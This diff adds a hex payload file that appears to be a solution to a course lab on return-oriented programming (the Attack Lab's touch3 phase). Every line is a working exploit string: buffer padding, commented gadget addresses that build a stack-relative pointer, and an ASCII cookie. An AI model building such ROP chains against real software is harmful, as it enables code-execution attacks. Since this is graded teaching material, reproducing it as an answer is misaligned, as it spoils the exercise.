@@ -1,0 +1,17 @@
+11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff 00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff 00 11 22 33 44 55 66 77 88 
+ad 1a 40 00 00 00 00 00 /* movq %rsp, %rax setval_350 */
+a2 19 40 00 00 00 00 00 /* movq %rax, %rdi addval_273 */
+cc 19 40 00 00 00 00 00 /* popq %rax getval_280 */
+48 00 00 00 00 00 00 00 /* The address shift */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx getval_481 */
+69 1a 40 00 00 00 00 00 /* movl %edx, %ecx getval_311 */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %rsi addval_436 */
+d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax add_xy */
+a2 19 40 00 00 00 00 00 /* movq %rax, %rdi addval_273 */
+fa 18 40 00 00 00 00 00 /* The address of touch3 */
+35 39 62 39 39 37 66 61 /* The ascii representation of 59b997fa */
+
+
+
+
+
